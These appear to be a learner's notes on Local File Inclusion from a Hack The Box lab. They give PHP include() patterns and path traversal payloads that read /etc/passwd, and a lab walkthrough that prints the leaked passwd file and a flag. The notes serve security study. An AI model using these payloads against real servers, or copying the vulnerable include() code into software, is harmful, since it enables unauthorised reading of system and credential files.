# Local File Inclusion (LFI)

Common readable files :
/etc/passwd
C:\Windows\boot.ini

## Basic case

URL : /index.php?language=es.php
Change to : /index.php?language=/etc/passwd

## Path Traversal

Previous injection with absolute path works if the whole input was used within the include() function :
include($_GET['language']);

If the developer adds a directory such as :
include("./languages/" . $_GET['language']);

Needs to use path transversal :
Based on the default location of web pages : /var/www/html/
../../../../etc/passwd

## Filename Prefix

If the developer adds a prefix such as :
include("lang_" . $_GET['language']);

In that specific case it won't works : lang_../../../etc/passwd

## Appended Extensions

Another very common example is when an extension is appended to the language parameter :
include($_GET['language'] . ".php");

If we inject /etc/passwd it would failed because /etc/passwd.php does not exist

--> We can read PHP files to check source code

## Second-Order Attacks

For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd)

-->  we would be poisoning a database entry with a malicious LFI payload in our username

Need to find another web application functionality would utilize this poisoned entry to perform our attack.

This vulnerability stills remain if the developer only protect against direct user input 

## LAB

http://94.237.55.163:43089/index.php?language=en.php

http://94.237.55.163:43089/index.php?language=en.php

http://94.237.55.163:43089/index.php?language=/etc/passwd

--> Failed

http://94.237.55.163:43089/index.php?language=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:105:107::/nonexistent:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin barry:x:1000:1000::/home/barry:/bin/sh

User : barry

http://94.237.55.163:43089/index.php?language=../../../../usr/share/flags/flag.txt

HTB{n3v3r_tru$t_u$3r_!nput}
